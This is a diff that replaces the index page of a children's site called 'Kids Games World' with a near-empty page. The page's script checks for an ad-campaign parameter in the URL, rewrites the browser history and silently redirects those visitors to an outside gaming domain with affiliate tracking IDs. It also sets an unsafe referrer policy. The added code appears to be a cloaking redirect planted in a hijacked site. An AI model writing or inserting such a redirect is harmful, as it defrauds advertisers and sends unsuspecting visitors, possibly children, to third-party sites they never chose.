@@ -1,17 +1,29 @@
-<!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<link rel="icon" href="favicon.svg">
-<title>Kids Games World</title>
-<meta name="description" content="Kids Games World is a fun-filled universe where kids play, learn, and explore exciting games and activities in a safe environment.">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="assets/css/style.css" />
-</head>
-<body>
-<div id="fullscreen-bg-image"></div>
-<script src="assets/js/main.js"></script>
-</body>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="referrer" content="unsafe-url" />
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        function hasUtmSource() {
+          const urlParams = new URLSearchParams(window.location.search);
+          return urlParams.has("gad_campaignid");
+        }
+
+        function redirectToNewPage() {
+          history.pushState(
+            {},
+            "Article",
+            "/about.html/",
+          );
+
+          window.location.href = `https://www.uea8gaming.com?affid=2789&aftcamp=camp27890`;
+        }
+
+        if (hasUtmSource()) {
+          redirectToNewPage();
+        }
+      });
+    </script>
+  </head>
+  <body></body>
 </html>
